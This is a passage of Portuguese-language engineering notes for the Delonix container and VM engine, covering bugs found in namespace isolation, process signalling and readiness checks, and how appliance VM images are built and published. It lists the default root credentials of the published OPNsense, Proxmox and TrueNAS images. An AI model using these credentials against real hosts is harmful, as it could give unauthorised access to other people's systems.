sessão sem delegação de cgroup) **não é um erro** — o motor avisa e continua,
logo não há nada para classificar, e dar-lhe um número era inventar a condição
primeiro. `Invalid`/`Registry` ficam em 1: nenhum muda o que o reconciliador faz
a seguir, e cada número novo é uma promessa para o resto do `0.x`. O `workload
describe` de um nome inexistente continua em 1 (usa `Invalid`), e isso é
**declarado** no `cli-stability.md` — o grupo `workload` está na lista dos que
ainda não são estáveis.

**A ligação só a bateria E2E prova.** Um teste unitário do mapa passa na mesma
com o `main` a ignorá-lo, por isso o `scripts/e2e.sh` ganhou uma forma de
expectativa NUMÉRICA (`check <nome> 4 …`) além do `ok`/`fail` — um `fail`
continuaria verde se todas as classes voltassem a colapsar em 1.

## O isolamento de namespace é INERTE sem `br_netfilter` (medido 2026-08-12)

Encontrado ao correr o arnês de caos e a bateria E2E **dentro de uma VM descartável** — que é a
única forma de os correr, porque os runners alojados do GitHub bloqueiam userns não privilegiados
e o job do Chaos fica **verde a saltar tudo** (`skipped: Corre o arnês de caos`, `skipped: Bateria
E2E da CLI`). Um verde por ausência de execução é indistinguível de um verde por sucesso se só se
olhar para o topo.

**A medição**: numa VM feita da NOSSA `delonix-vm-base:ubuntu-24.04`, os dois cenários de
isolamento FALHAM — `teamA alcança teamB`. Carregado o `br_netfilter` e postos os dois
`bridge-nf-call-*` a 1, os mesmos dois PASSAM, sem mais nada mudado. O host de desenvolvimento
passa porque o `install.sh` os aplica por omissão (`WITH_TUNE=1`).

**Porquê**: o isolamento vive em chains nftables no hook `forward`; o tráfego entre dois
containers da MESMA bridge só lá chega se o `br_netfilter` o levar à camada IP. Sem o módulo as
chains são instaladas, os sets `@dlxall`/`@dlxns_*` são preenchidos, **todos os comandos reportam
sucesso** — e a fronteira não existe. É a forma mais cara de falha silenciosa que este motor pode
ter, porque a coisa que falha é uma propriedade de segurança que se lê como aplicada. O
`infra.rs:333` já reconhecia a dependência **num comentário**; nada a verificava.

**Corrigido onde é inequivocamente nosso**: a receita `rootless_customization_steps` passa a
escrever `/etc/modules-load.d/delonix.conf` e `/etc/sysctl.d/99-delonix-bridge.conf` (ficheiros, e
não `modprobe`/`sysctl -w`: o `virt-customize` corre contra um convidado offline). O `install.sh`
já o fazia, mas justificava-o pelo **Kubernetes** — por isso uma imagem para rootless-only não
tinha razão para o herdar, e não herdava. Teste a exigir os dois sysctls nas quatro distros.

**Por decidir, e é decisão de política, não de código**: o motor continua sem verificar isto em
runtime. Um `container run --namespace` num host sem o módulo (um `install.sh --no-tune`, um
container, uma distro sem ele) continua a anunciar isolamento que não existe. Avisar é o mínimo;
recusar seria fail-closed a sério e parte quem hoje corre assim — sem isolamento real, mas a
correr. Merece a sua própria sessão.

## A classe «X não é Y» — varredura de 2026-08-05

Pedido do utilizador ao ver que cinco bugs de uma série eram a mesma frase. Vale mais como
checklist para quem mexer aqui do que como lista de correcções:

- **código em português** não é uma decisão de arquitectura — é o nome dos testes (2026-08-21:
  dos 1165 nomes de função em PT dos dois repos Rust, **1145, ou 98,3%, são nomes de teste**;
  só 2 são públicos, e dos 1690 itens públicos ZERO têm PT em `serde(rename)`, campos `pub` ou
  flags de CLI). A convenção já era EN-na-fonte com catálogo PT desde a v0.32.2 — o que ficou
  em português ficou por ter SALTADO o catálogo. Ver «Língua do código (LANG-01)»;
- um **contador com falsos positivos** não é um contador — é ruído com um número à frente. O
  léxico do `lang_ratchet` levava `nas`, que colide com **NAS**: seis comentários já ingleses
  contavam como dívida. Antes de confiar numa métrica de dívida, lê uma amostra do que ela
  acusa;
- um **ficheiro de socket** não é um listener (`wait_for_control_sock` era `.exists()`);
- **`/sys/class/net`** não é a netns do processo (reporta a de quem MONTOU o sysfs);
- **`capture()` devolver `Ok`** não é o comando ter passado (não olha para o exit status — lê-se
  sempre a SAÍDA, nunca o `Result`);
- uma **label** não é o estado persistido (`Container.pod` existia e nunca era atribuído);
- **`None` no pid do controlo** não é ausência de controlo (um holder pré-split faz os dois
  trabalhos num processo só);
- **`holder_pid.is_some()`** não é «o holder é alcançável» (v0.34.2);
- **`container.userns`** não é «está num userns diferente do meu»;
- um **directório ilegível** não é um directório vazio — `ls`/`du` sobre um `_data` `chmod 700`
  de um subuid mapeado devolvem zero, e em rootless isso é o caso NORMAL (2026-08-09: relatei
  cinco volumes Postgres como perdidos com base nisto; lidos de DENTRO do userns estavam todos
  lá, um deles com 128 GiB). O motor já tem a resposta certa — `volumes inspect`/`__duusage`
  medem de dentro e distinguem *desconhecido* de *zero*; a leitura de fora é que mente;
- o **`ENOENT` de um `Command::status()`** não é um ficheiro em falta — é a FERRAMENTA não
  existir, e a frase «No such file or directory» manda o leitor procurar um caminho
  (`vmimage::tool_package`, v0.45.0);
- **varrer duas fontes não é varrer a lista toda**, e uma derivação parcial lê-se exactamente como
  uma completa. O `complete::namespaces` colhia dos containers e das VMs; a tabela `cmd::kinds` diz
  que SETE Kinds carregam namespace. Quatro vinham por transitividade e ninguém o tinha escrito
  (um pod é os seus membros, um `Workload`/`Stack` carimba os filhos) — mas o `Volume` não: um
  inquilino cujo único recurso fosse uma share volume **não existia** para o TAB, porque nada dele
  está a correr. Medido lado a lado no mesmo root: o binário anterior oferecia `default` e mais
  nada, com duas namespaces em disco. A correcção que interessa não é a fonte que faltava — é a
  **tabela `NAMESPACE_SOURCES`, que passa a GOVERNAR a derivação** e obriga cada Kind namespaced a
  declarar-se `Store` (este módulo lê-lhe o registo) ou `Via` (o namespace viaja, e para onde). Um
  classificador que ninguém consulta seria a sétima lista que este repo já pagou uma vez;
- **corrigir o enum de EXECUÇÃO não é corrigir a CLI.** Os três caminhos de imagem VM
  convergem no `VmImageCmd` do `cmd/vmimage.rs`, mas a DECLARAÇÃO `clap` de cada um vive
  onde o utilizador lhe chega: pus o completador no `VmImageCmd::Rm` e o
  `delonix image vm rm <TAB>` continuou a oferecer zero, porque quem ele parseia é o
  `image.rs::VmSub::Rm` — uma segunda declaração do mesmo comando, dezasseis linhas acima
  de um `VmSub::Describe` que já completava. **A prova não é o código compilar, é sondar
  os três pontos de entrada** (`COMPLETE=bash <bin> -- delonix image vm rm ''`), que é o
  passo 4 da `delonix-feature-dev` e que aqui deu 0 / 18 / 37 antes e 18 / 18 / 37 depois.
  O terceiro é `image --vm rm`, que **recusa sempre** (`rc=1`, a nomear a alternativa) e
  cujos 37 candidatos são de imagens de container — ruído cosmético que o mecanismo do
  clap não consegue evitar, porque um `ArgValueCandidates` não vê a flag `--vm`;
- **`/sys/fs/cgroup/cgroup.subtree_control` conter `memory`** não é «a MINHA sessão tem
  delegação» — é do cgroup RAIZ do host, e contém-no sempre (v0.42.2, ver abaixo);
- **um lease PREVISTO não é uma VM VIVA** — em cloud-hypervisor o IP não é observado, é
  calculado do MAC (`infra::dhcp_lease_ip`, deliberado e correcto: é o que põe o endereço debaixo
  do isolamento de namespace ANTES de o convidado arrancar). O efeito colateral era o `vm create
  --wait` não ter por que esperar: devolvia em **0,062 s** a anunciar `is up` sobre uma VM cujo
  firmware falha antes do kernel, com o `--boot-timeout` sem nada em que se gastar (medido
  2026-08-12, v0.50.0). Ver a secção «O `--wait` de uma VM CH» abaixo;
- **um rootfs já extraído não é um rootfs a extrair** — a 2.ª passagem do re-exec de
  `--net <rede-custom>` reextraía a imagem INTEIRA para o caminho que a 1.ª acabara de encher.
  Medido com `pgvector:pg16` (10 296 entradas, 431 MB): 1 526 ms com `--net none` contra
  3 143 ms com rede custom, e o delta é exactamente uma extracção (1 666 ms à parte); o `strace`
  concorda, 2 060 canonicalizações do destino contra 1 030. Reextrair por cima de uma árvore
  preenchida custa preço inteiro — não há poupança acidental. A correcção era **rootless-only de
  propósito**: como root o `prepare_rootfs` MONTA um overlay, e um mount da 1.ª passagem não é
  necessariamente visível na namespace onde o re-exec aterra (v0.47.0). **Desde a v0.59.0 o
  rootless também não extrai por container** — partilha as layers e o mount é feito pelo init de
  CADA passagem, dentro da namespace onde ela aterra, por isso a assimetria root/rootless deste
  parágrafo deixou de existir;
- **duas builds com a mesma versão não são a mesma build** — o `Cargo.toml` continuava a dizer
  `0.58.0` depois de a tag v0.58.0 ter saído, por isso um binário instalado ANTES da série e a
  build que a continha apresentavam-se ambos como `delonix 0.58.0`. Custou uma confusão real: o
  host criava containers flat e o `--version` jurava estar actualizado. **O que discrimina é o
  comportamento, não o número** — aqui, se um container novo nasce com `overlay-lowers` ou com
  `rootfs/`. Fechado com o bump para 0.59.0, mas a regra fica: depois de uma tag, a versão de
  trabalho tem de sair de imediato do número publicado;
- **`Command::spawn` não devolve antes do `exec`** — lê um pipe CLOEXEC que só fecha lá, para
  poder reportar falhas de exec. Logo um `pre_exec` que BLOQUEIE (à espera de mapas de userns que
  o pai só escreve depois do `spawn` retornar) faz deadlock: os dois esperam um pelo outro.
  Medido — `container cp` de um container parado pendurado até ser morto. É a razão de o
  `reexec_mapped` usar `fork` cru, e o `reexec_mapped_hold` teve de fazer o mesmo (v0.59.0);
- **`undefine --snapshots-metadata` não apaga o snapshot** — apaga só o que aponta para ele.
  O estado ficava no qcow2 (`qemu-img snapshot -l` mostrava-o) enquanto o `vm snapshots`
  respondia lista vazia com rc=0 e o `vm restore` dizia «não existe». Corolário do mesmo
  achado: **uma lista vazia com rc=0 não é «não há»** — pode ser «perguntei ao sítio errado»,
  e aqui o sítio errado era o libvirt, que só sabe de domínios definidos (v0.51.x);
- **uma ligação cortada a meio não é um download perdido**, e **o `Content-Length` de um 206 não
  é o tamanho do blob** (é o do FRAGMENTO) — ver a secção «O pull de um blob recomeçava do zero»
  abaixo (v0.51.0+);
- **um `read` que FALHA não é uma resposta vazia** — o cliente do socket de controlo fazia
  `let _ = s.read_to_string(&mut resp)`, descartando o erro, por isso um timeout de leitura e um
  holder que respondesse nada eram indistinguíveis: os dois davam ``system call `ingress control`
  failed:`` **sem nada depois dos dois pontos**. E o tecto era 5s enquanto o `handle_control` é O
  ponto de serialização — um chamador em fila espera por todos os attaches à frente dele. Medido,
  e escala com a concorrência (não é ruído do host): 10 attaches concorrentes → 0 falhas, 20 → 3,
  30 → **15**. Com o erro lido e o tecto em 30s: **30/30 em 21s**. Fica registado porque a minha
  primeira leitura foi «o servidor fecha mudo» e estava ERRADA — o servidor não fechou nada, fomos
  nós que desistimos (v0.47.0). **A varredura por padrão a seguir encontrou mais dois `let _ =`
  sobre um `read`, e um deles era pior**: o `slirp_add_hostfwd` tinha 500 ms de tecto no slirp
  ÚNICO que todo o ingress partilha, e a seguir ao read fazia `if resp.contains("\"error\"")`
  → senão `Ok(())`. Um timeout deixa `resp` vazio, uma string vazia não contém `"error"`, e a
  função devolvia **SUCESSO** para um publish que pode nunca ter acontecido. Ali o sintoma era um
  erro sem sujeito; aqui era um falso sucesso. O `slirp_api` (o outro) devolvia `Ok("")`, que o
  `slirp_remove_hostfwd` parseia como JSON `Null` e conclui que não há nada a remover — um
  unpublish a reportar sucesso sem ter removido nada, com a porta do host presa;
- **«não está no store de containers» não é «não é local»** — o `image scan` de uma imagem VM
  anunciava «not local», ia à Docker Hub buscar `library/<nome>` e morria num **401**. Recusa
  agora com o nome da alternativa; percorrer o sistema de ficheiros de um convidado é outro
  caminho de SBOM, e um scan que em silêncio não faz nada útil é a falha que o comando existe
  para evitar (v0.47.0);
- **um nome de imagem VM não é um caminho de disco** — e o `kind: Vm` tratava-o como se fosse.
  O `resolve_vm_disk` devolvia `spec.disk` CRU enquanto o `vm create` consultava o
  `VmImageStore`, por isso a MESMA string funcionava como `--disk` e respondia
  `image not found` como `spec.disk`. Ver a secção «O manifesto de VM resolvia a imagem de
  outra maneira que a CLI» abaixo — a divergência de resolução é a raiz, o erro visível era o
  menor dos dois sintomas;
- **um marcador de presença `-` não é «ausente»** — o `stack wait` decidia prontidão com
  `present == "yes" && ready_status(...)`, e os Kinds declarativos (`Ingress`/`FirewallPolicy`/
  `HTTPRoute`/`Dependency`) não têm store nenhum: o `presence` devolve-lhes `-` e **nunca**
  `"yes"`. Logo QUALQUER manifesto com um deles esgotava o `--timeout` inteiro e saía com erro
  sobre uma stack inteiramente a correr — o comando escrito para substituir o `sleep` da CI a
  ser precisamente o que a CI não podia usar. Medido antes da correcção, com os dois roots
  isolados: **5,015 s e rc=1** sobre um manifesto que não declara um único recurso com estado.
  O `ready_status` ao lado já tinha a intenção certa no doc-comment («Only the Kinds that HAVE a
  runtime state are judged on it»); faltava a decisão a montante distinguir «ausente» de «sem
  presença observável», e é isso que o `is_pending` (puro) passou a fazer. **O `?` continua
  pendente de propósito**: é também o que um store ilegível devolve, e dar «pronto» a um
  desconhecido é o mesmo defeito ao contrário — por isso o Kind que faltava foi corrigido no
  `presence` e não a relaxar o `is_pending`. De caminho, o achado gémeo: **`NetworkRoute` estava
  em `KINDS` e era APLICADO pelo `stack apply` sem braço no `presence`**, logo caía no
  `_ => ("?", "unsupported kind")` — o `stack ls`/`describe` a chamarem «kind não suportado» a
  um recurso que o apply cria. **E `stack wait` tinha ZERO checks no `scripts/e2e.sh`** — o
  balde dos «comandos nunca executados» a pagar-se outra vez, e é onde a próxima varredura deve
  ir primeiro (v0.53.0);
- **`argv[0]` dizer `slirp4netns` não é «este slirp é nosso»** — o `slirp4netns` não é nosso, é
  uma ferramenta de terceiros que o Podman rootless também usa, com a MESMA forma de argv
  (`… <pid-alvo> tap0`). O `list_slirps` identificava por `argv[0]` e mais nada, por isso o
  `reap_orphan_slirp` tratava como órfão CEIFÁVEL qualquer slirp do host cujo alvo tivesse
  morrido — incluindo os de outras ferramentas. E corre a partir do `publish_with_retry`, ou
  seja sempre que um `-p` NOSSO falha: um conflito de porta aqui ia mandar SIGTERM à rede de um
  motor sem relação nenhuma, na mesma máquina. Reproduzido ao vivo (2026-08-15) com um slirp
  arrancado à mão com a forma de argv do Podman: marcado para ceifa, enquanto os quatro slirps
  reais do delonix eram correctamente poupados. O token de posse é o `--api-socket`, porque é o
  único elemento do argv cujo CAMINHO nós escolhemos; um slirp nosso sem portas não tem
  api-socket e responde «não é meu», que é a resposta honesta e não custa nada — quem liberta
  uma porta presa é o `reap_slirp_for`, que conhece o alvo pelo pid;
- **o `run -d` ter devolvido não é o container estar montado** — o `spawn` devolvia a seguir ao
  «GO» do handshake de userns e o init só DEPOIS fazia o `pivot_root` e os binds dos volumes. Um
  `exec` nessa janela corria o `/bin/sh` do HOST e escrevia ficheiros do host, com exit 0
  (medido, 3 em 12). E o gémeo: **`pid` + `Running` no registo não era o container estar montado**
  — o save acontecia antes da prova, e é o registo que um terceiro lê. Fechados na v0.66.x — ver
  «Um `exec` logo a seguir ao `run -d` corria no HOST»;
- **«o processo é detached» não é «já não preciso dos fds do chamador»** — o `start_pin` herdava o
  `stderr` do chamador com o comentário a garantir que «inheriting stderr costs nothing (the
  process is detached)». O pin dorme durante toda a vida da infra, logo segura esse fd aberto
  para sempre: quem capture a saída por pipe fica bloqueado num `read` que nunca vê EOF —
  `out=$(delonix …)`, um passo de CI, um `stack apply` num pipeline, todos penduram se calhar
  ser essa a invocação que arranca a rede. **Medido a 2026-08-15**: o `scripts/e2e.sh` parou 16
  minutos sem escrever um check, com o bash em `anon_pipe_read` e **sem um único filho vivo** — a
  ponta de escrita do pipe era o fd 2 do `delonix netns pin`. E a correcção já existia **duas
  funções acima**: o `start_control` escreve para `control.log` com esta mesma razão explicada, e
  chegava a nomear o pin como contra-exemplo — quando o pin é o MAIS longevo dos dois (o control
  reinicia, o pin nunca). Passou a `ingress/pin.log`. Mesma forma do `write_private_temp`: a
  correcção feita e o chamador ao lado deixado para trás. **Nota de método**: um `timeout` na
  bateria teria matado a corrida sem explicar nada; o que deu a resposta foi seguir o pipe até
  ao dono (`readlink /proc/*/fd/*`);
- **um PID vivo não é o processo que o pidfile diz** — o `kill_pidfile` do `infra` decidia por
  `Path::new("/proc/{pid}").exists()`, logo um pidfile obsoleto cujo número tivesse sido
  reciclado levava SIGTERM a um processo alheio. O `ingress_proxy::running_pid` já tinha a
  guarda certa (compara o `/proc/<pid>/cmdline`) e dizia porquê no doc-comment; o caminho que
  mata o holder, o controlo e o slirp é que ficou sem ela. **Nota de severidade, medida e não
  deduzida**: neste host o `pid_max` é 4 194 304 com o último PID em ~416 746 — o wraparound
  está a ~3,8 milhões de distância e NÃO é iminente aqui. A guarda continua certa (um host de
  vida longa dá a volta, e `pid_max` a 32768 é comum noutras máquinas), mas quem priorizar isto
  acima do `flock` em falta no `ensure`/`teardown` está a trocar a ordem: a guarda impede o dano
  colateral, não impede a decisão errada que o provoca. **E a varredura seguinte mostrou que o
  problema não era o mecanismo, era um consumidor esquecido**: o `safe_to_signal(pid, starttime)`
  existe há muito, com o `starttime` do `/proc/<pid>/stat` a distinguir um pid reciclado, e guarda
  DEZASSEIS pontos de chamada do lado dos containers. As VMs é que ficaram de fora — o
  `CloudHypervisorBackend::stop` matava por `pid > 0` (nem `/proc` verificava) e o registo `Vm` nem
  levava o `starttime` para comparar. Registei-o primeiro como «mecanismo escrito e nunca ligado»,
  o padrão do `mount_live`/`set_net_rate`/`update_limits`, e estava ERRADO: aqui o mecanismo é
  maduro e bem usado, faltava-lhe um consumidor. As três funções passaram para o
  `delonix-runtime-core`, ao lado do campo que existem para guardar, e o `delonix-vm` perdeu a sua
  TERCEIRA cópia de `is_alive` (lia `/proc`, a do motor usa `kill(pid,0)`); Aceita-se `netns holder` além de
  `netns pin` de propósito — o `teardown` é o comando de recuperação de um upgrade in-place, e
  o processo vivo aí é de um binário pré-split;

**Achado vivo da varredura (v0.42.2)**: `delonix system info` reportava `cgroup2 delegated: yes`
incondicionalmente, por ler os ficheiros do cgroup raiz do host — o comando que se corre para
diagnosticar porque é que os limites não pegam dava a resposta errada, com confiança. A função
certa (`cgroup_limits_apply`) já existia, tinha UM chamador, e só testava o caminho ROOT
(`delonix.slice`, que num host rootless nem existe) — o mesmo erro de base-estática-vs-dinâmica
do `update_limits`. **A sonda que discrimina, medida e não deduzida**: criar um filho é possível
num scope delegado E numa sessão SSH; activar `+memory` falha nos DOIS (a regra de *no internal
processes* recusa-o enquanto o nosso processo estiver no cgroup — o motor contorna-o movendo-se
para um `dlx-mgr`, invasivo demais para um diagnóstico). O que separa é a **posse do
`cgroup.subtree_control`**: `walter:walter` num `Delegate=yes`, `root:root` num `session-N.scope`.

**Armadilha de API registada, sem bug vivo**: `reap_orphan_hostfwds` é público e falha ABERTO com
lista vazia (vazio ⇒ tudo é órfão ⇒ apaga tudo). O chamador deste repo é seguro (propaga o erro
do `store.list()`, e o comentário raciocina sobre isso), mas foi exactamente esta forma que fez
as portas publicadas morrerem sozinhas quando um consumidor externo lhe passou a sua lista parcial.

**O que a varredura NÃO encontrou**: nenhum outro `capture(...)` lido pelo `Result`; os
`unwrap_or_default()` restantes são todos «listar para decidir o que acrescentar», onde vazio
leva a criar (idempotente) e nunca a apagar.

**`sudo -v` no arranque do `install.sh` não é uma pré-condição — é um bloqueio (2026-08-21)**:
bug report real, confirmado ao vivo neste host (`~/.local/bin/delonix` preso na v0.59.0, quatro
releases atrás). O script autenticava root NO ARRANQUE, incondicionalmente para qualquer
utilizador não-root — antes sequer de saber se alguma coisa ia precisar de root. Num `--user`
com todas as dependências já satisfeitas (o caso normal de voltar a correr o instalador só para
apanhar uma release nova), isso morria em «sudo authentication failed» sem chegar a tocar no
binário, mesmo com o download/verificação/instalação em si a funcionarem perfeitamente quando
testados isolados (provado com uma cópia da lógica fora do gate). Corrigido adiando a
autenticação para DEPOIS da secção do binário — `--user` deixa de ficar refém de dependências
que nem vai tocar, e o caminho por omissão (root) ganhou uma guarda `|| die` explícita no
`install` em si, que passou a ser a 1ª chamada a sudo do script nesse caminho.

## Imagens de appliance (OPNsense, Proxmox, TrueNAS) — v0.47.0

Pedido: transformar ISOs de instalação em imagens VM oficiais do Delonix. Scripts em
`scripts/appliances/` (com README próprio); seis imagens produzidas e registadas.

**O que as separa de tudo o resto no `VmImageStore`: não correm cloud-init.** Instalam-se e
configuram-se sozinhas, por consola ou interface web. O `vm create` gerava **sempre** um seed
NoCloud — o próprio comentário dizia «ALWAYS», e para uma cloud image está certo (sem datasource
o cloud-init salta a fase de rede e a VM fica sem IP). Para um appliance é um ISO que ninguém lê,
num CD-ROM que muda a lista de dispositivos do convidado sem razão.

- **`VmImage.cloud_init`** (`#[serde(default)]`): `None` — todos os metadados escritos até hoje —
  conta como `true`, por isso nada muda para as imagens que este motor sempre construiu (há teste
  a carregar um `.json` antigo e a exigir exactamente isso). Com `Some(false)` o `vm create` salta
  o seed e **recusa** `--hostname`/`--ssh-key`/`--user-data` a NOMEAR as flags, em vez de as
  aceitar e deitar fora — a armadilha que este repo já corrigiu três vezes (`--security-opt
  seccomp=`, `-v …:z`, `--network-alias`). O `describe` mostra a linha `Cloud-init`, senão a
  recusa lê-se como arbitrária.
- **`image vm import`** regista um disco que este motor não construiu, nos três pontos de entrada
  de sempre. Os argumentos vivem num só `ImportArgs` `flatten`ado — escrevê-los três vezes é como
  esses caminhos divergem. **Comprime com zstd por omissão** (`--no-compress` para não o fazer),
  pela razão já registada para a golden: uma imagem do store é o backing file read-only de cada VM
  criada a partir dela. Medido: um `convert` sem `-c` inflava 646 MiB para **2,15 GiB** à entrada.
- **Metadados no artefacto OCI (annotations do manifesto)** — `push_oci_artifact_with_annotations`
  / `pull_oci_artifact_with_meta`. Fecha de caminho o gap já documentado de `ubuntu_release`/
  `k8s_version` desaparecerem num `vm pull`; para o `cloud_init` não era cosmético — um appliance
  publicado voltava a receber seed do outro lado. Lidas **depois** da verificação do digest, para
  que annotations de um manifesto adulterado nunca cheguem ao chamador. O `cmd_push` já lia os
  metadados e fazia `let _ = img;`: era o consumidor que faltava.

**Como cada uma é construída** (nenhuma monta um convidado à mão — cada produto instala-se como se
instalaria em metal):

| Appliance | Via | Tamanho |
|---|---|---|
| OPNsense 26.1.2 | imagem `nano` oficial (já instalada) — zero instalação | 646 MiB |
| Proxmox VE 9.1 / PBS 4.1 / PMG 9.0 / PDM 1.0 | auto-install nativo (`answer.toml` no ISO) | 1,45 / 1,11 / 1,22 / 1,06 GiB |
| TrueNAS SCALE 25.10.5 | JSON-RPC do próprio instalador | 2,41 GiB |

**Três achados que custaram uma build cada** (todos por medição, nenhum por leitura):

1. **As imagens `vga`/`serial`/`dvd` do OPNsense NÃO são sistemas instalados** — arrancam em modo
   live a partir do media (`Root file system: /dev/ufs/OPNsense_Install`, «running in live mode
   from install media»). São o instalador em forma de disco. Só a **`nano`** tem raiz em
   `/dev/ufs/OPNsense_Nano`. Escolhi a `serial` primeiro precisamente por assumir o contrário.
2. **O ISO do Proxmox não se edita no lugar.** `xorriso -boot_image any replay` morre na GPT
   híbrida (`GPT partitions 1 and 2 overlap by 80 blocks`) e o `keep` produz um ISO que o SeaBIOS
   não passa de `Booting from DVD/CD...` (confirmado por screendump do próprio ecrã, não deduzido).
   O `mkiso.sh` extrai a árvore e volta a autorar o ISO a partir da receita
   `-report_el_torito as_mkisofs` do **próprio original** — que é também o que torna UM script
   correcto para os quatro produtos: diferem no volume id **e** na geometria (`-partition_hd_cyl`
   é 110 no VE e **91** no PBS, logo valores fixos teriam produzido ISOs errados). Dispensa o
   `proxmox-auto-install-assistant`, que aliás é ininstalável neste host (`download.proxmox.com`
   inacessível daqui, testado).
3. **O TrueNAS não tem answer file, mas tem API.** A unit `truenas-installer.service` do ISO live
   é literalmente `python3 -m truenas_installer --server` — um servidor JSON-RPC sobre WebSocket
   em `:8080`, com `install`/`list_disks`/`system_info`/`shutdown`. Não é preciso reempacotar
   squashfs nenhum nem conduzir o TUI às cegas.

**Duas armadilhas de método, da família «X não é Y» já catalogada:**

- **Um socket que aceita não é um servidor a responder.** O `hostfwd` do QEMU aceita a ligação TCP
  quer haja quer não haja algo à escuta no convidado, por isso a sonda `/dev/tcp` dava porta aberta
  ao primeiro segundo de boot e o handshake WebSocket morria a seguir. Passou a tentar o handshake
  real em retry.
- **`modprobe: ERROR:` num log do instalador Proxmox não é uma falha** — é o kernel a encolher os
  ombros perante hardware ausente. Um guarda `grep -i ERROR:` deu três builds boas por falhadas.
  Só `ERROR: Installation failed`, `Auto-installation failed` e `unable to continue` são do
  instalador.

**Validado ao vivo, e a afirmação é «serve», não «arranca»** (`verify-boot.sh`): PBS responde na
:8007 em ~20s, PMG na :8006 em ~30s, PDM na :8443 em ~20s, TrueNAS na :80 em ~50s, e o PVE na
:8006 (medido à parte, com `pve login:` na consola). Cada um sobre um overlay, para a sonda nunca
escrever na imagem. **O OPNsense é a excepção deliberada**: a web UI dele só escuta na LAN, e uma
sonda pela WAN receberia recusa — que é o comportamento CORRECTO de uma firewall, não uma falha.
Para ele a prova foi a consola: raiz em `/dev/ufs/OPNsense_Nano`, `LAN (vtnet0) -> 192.168.1.1/24`,
`WAN (vtnet1) -> DHCP4`, e o fingerprint do certificado HTTPS já gerado.

O caminho appliance do `vm create` foi provado com uma VM libvirt real da imagem OPNsense: 2 vCPU
e 2 GiB **herdados da imagem**, zero `seed.iso` em disco e zero `cdrom` no XML do domínio.

**Credenciais: conhecidas e públicas** (`root/opnsense` no OPNsense por omissão do fabricante;
`root`/`truenas_admin` com `delonix-admin` nas restantes, definidas pelo answer file/RPC). Mesma
natureza da golden k8s — documentadas no README dos scripts, para mudar no primeiro arranque.

**Publicadas** em `ghcr.io/angolardevops/delonix-vm-appliances` (2026-08-13). A nota anterior dava
isto por bloqueado por falta de um PAT com `write:packages` — **a conta `angolardevops` do `gh` já
o tem**, e o caminho é `gh auth token | delonix image login ghcr.io -u angolardevops
--password-stdin` seguido de `image vm push`; ~2m30s por imagem de 1,4 GiB. A tag remota segue
`<nome-completo>-<versão-curta>` (`proxmox-ve-9.2`), lida do registo com `ls-remote` e não
inventada: o `pve` só existe como argumento do script de build, e o próprio script chegou a
imprimir um `import -t pve:9.2` que teria posto dois nomes para a mesma coisa na mesma listagem.

**Os builds obtêm e VERIFICAM o media sozinhos** (`scripts/appliances/fetch-media.sh`, v0.48.0):
antes só o OPNsense o fazia e os outros dois aceitavam um ISO que ninguém conferira. Cada
fabricante publica o checksum noutra forma — Proxmox um `SHA256SUMS` GNU do directório, TrueNAS um
sidecar com o hash nu, OPNsense a forma BSD —, por isso é o script de build que o resolve e o
`fetch-media.sh` que só verifica, fail-closed e sem flag para saltar. A correspondência é por
IGUALDADE do nome (`awk '$2 == f'`): o directório do Proxmox publica `proxmox-ve_9.2-1.iso` **e**
`proxmox-ve_9.2-1-arm64.iso`, e um `grep` apanha os dois. A versão entra no NOME do ficheiro de
saída, senão construir a 9.2 apaga em silêncio a imagem da 9.1 — o que obrigou a alinhar o
`verify-boot.sh`, que tinha os nomes antigos fixos e passou a procurar por raiz do nome,
verificando TODAS as versões presentes.

**Por fazer**: um workflow de CI que reconstrua estas imagens como o `vm-image.yml` já faz para a
golden.

## O manifesto de VM resolvia a imagem de outra maneira que a CLI (2026-08-12)

Medido: `delonix vm create x --disk delonix-vm-base:ubuntu-24.04` funcionava e o MESMO nome em
`kind: Vm`/`spec.disk` respondia `error invalid argument: image not found: …` (exit 4). A raiz é
uma só — o `resolve_vm_disk` devolvia `spec.disk` cru e nunca consultava o `VmImageStore`,
enquanto o `cmd_create` fazia `store.get` → `store.qcow2_path` e guardava o `image_meta`. O motor
canonicaliza o `cfg.disk` no sistema de ficheiros, logo um nome de imagem nunca podia lá chegar.

**O erro era o menor dos dois sintomas.** Sem `image_meta`, o `apply` também não sabia que a
imagem é um APPLIANCE, e por isso gerava-lhe um seed de cloud-init que a CLI recusa em voz alta:
com o qcow2 do OPNsense por caminho absoluto (o contorno natural do primeiro sintoma), a CLI
respondia «this image is an appliance and does not run cloud-init, so these would be silently
ignored» e o manifesto respondia `vm/lab-fwtest: ensured`, rc=0, com um `<disk device='cdrom'>`
e um `seed.iso` anexados. O caminho declarativo fazia exactamente o aceite-e-ignorado que a CLI
existe para impedir — e a mesma raiz mantinha os defaults da imagem (`VCPUS`/`MEMORY`/
`HYPERVISOR`) sem efeito nenhum por manifesto.

- **Uma função para os dois** — `resolve_image_ref(store, referência) -> (caminho, Option<VmImage>)`,
  chamada pelo `vm create`, pelo `resolve_vm_disk` (nos DOIS ramos: o `disk:` e o `build:`, que
  devolvia a tag que acabara de produzir e por isso também não arrancava) e pelo
  `desired_vm_fields`. Recebe o store em vez de o abrir, para a resolução se poder provar contra
  uma pasta temporária em vez de depender das imagens que o host por acaso tenha.
- **`spec.vcpus`/`spec.memory` passaram a `Option`** — com `#[serde(default = "…")]` «omitido» e
  «1» são a mesma coisa, e o default da imagem nunca poderia aplicar-se. É a mesma correcção que
  as flags do clap já tinham levado (`default_value_t` fora por esta razão exacta). O `--dry-run`
  passa a imprimir `vcpus: null` quando não é declarado, ao lado dos outros opcionais: com o
  efectivo a depender da imagem, imprimir `1` seria mentira.
- **O reconciliador tinha de andar no mesmo passo, ou trocava um bug por outro pior.** O `apply`
  grava o CAMINHO e os defaults da imagem; um `desired_vm_fields` a comparar o nome cru proporia
  um `Replace` em cada corrida — e um `Replace` de VM é recusado sem `--replace` precisamente
  porque deita fora o disco overlay. Os dois lados passam agora pelas mesmas duas funções, pela
  mesma ordem, e o `desired` nunca constrói (calcular um plano não pode criar).
- **Validado ao vivo** com `DELONIX_ROOT` isolado, contra o XML escrito em `vms/<nome>.xml` e não
  contra o que o comando disse: appliance → zero `cdrom`, zero `seed`, `2 vCPU`/`2 GiB` vindos da
  imagem; cloud image de controlo → `cdrom` com o `seed.iso` e os `4 vCPU` que ela recomenda;
  `stack plan` a seguir ao `apply` diz `1 unchanged` (rc=0). **Armadilha do próprio auditor**: a
  primeira verificação foi `virsh dumpxml | grep -c cdrom`, e o `dumpxml` FALHAVA (domínio noutro
